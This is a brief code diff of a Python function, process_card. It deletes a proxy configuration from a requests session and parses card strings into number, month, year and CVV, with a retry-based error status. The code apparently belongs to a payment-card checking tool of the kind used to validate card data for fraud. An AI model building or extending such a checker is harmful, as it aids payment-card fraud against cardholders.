@@ -73,11 +73,7 @@ async def process_card(card: str) -> str:
             c = requests.Session()
 
             # Configurar proxy en la sesión
-            c.proxies = {
-                "http": proxy_url,
-                "https": proxy_url,
-            }
-
+         
             
             
             cc_number, mes, ano_number, cvv = card.split('|')
@@ -386,6 +382,7 @@ async def process_card(card: str) -> str:
     else:
 
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
+
 
 
 
